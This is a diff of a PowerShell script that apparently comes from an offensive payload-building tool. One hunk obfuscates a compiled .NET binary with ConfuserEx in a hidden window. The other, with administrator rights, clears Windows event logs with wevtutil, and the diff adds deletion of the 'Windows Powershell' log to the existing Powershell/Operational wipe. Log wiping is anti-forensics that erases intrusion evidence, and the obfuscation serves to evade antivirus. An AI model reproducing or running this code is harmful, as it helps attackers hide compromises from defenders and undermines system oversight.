@@ -343,7 +343,7 @@ If($Action -ieq "Compile" -or $Action -ieq "Execute"){
          Start-Process -WindowStyle Hidden -filepath "Confuser.CLI.exe" -ArgumentList "-noPause `"$BinaryName`" -out `"Obfuscated.exe`""
          If(-not(Test-Path -Path "$ZipDirectory\Obfuscated.exe" -ErrorAction SilentlyContinue)){
 
-            Write-Host "[error] fail to obfuscate '${BinaryName}' NET binary!" -ForegroundColor Red -BackgroundColor Black
+            Write-Host "[error] ConfuserEx: fail to obfuscate '${BinaryName}' NET binary!" -ForegroundColor Red -BackgroundColor Black
             Stop-Process -Name "Confuser.CLI" -ErrorAction SilentlyContinue -Force|Out-Null
 
          }Else{## Binary successfully obfuscated!
@@ -451,12 +451,20 @@ If(Test-Path -Path "$IconFile" -EA SilentlyContinue){
 $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 If($IsClientAdmin){## Clean related eventvwr logfiles
 
-   $CleanPS = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
+   $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
       $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
 
-   If($CleanPS -gt 0){## Delete ALL Powershell LogFiles
+   If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
       Write-Host "[+] Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
       wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
+   }
+
+   $CleanWPS = (wevtutil gli "Windows Powershell" | Where-Object { 
+      $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
+
+   If($CleanWPS -gt 0){## Delete ALL Powershell LogFiles
+      Write-Host "[+] Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
+      wevtutil cl "Windows Powershell" | Out-Null
    }
 
    $CleanBT = (wevtutil gli "Microsoft-Windows-Bits-Client/Operational" | Where-Object { 
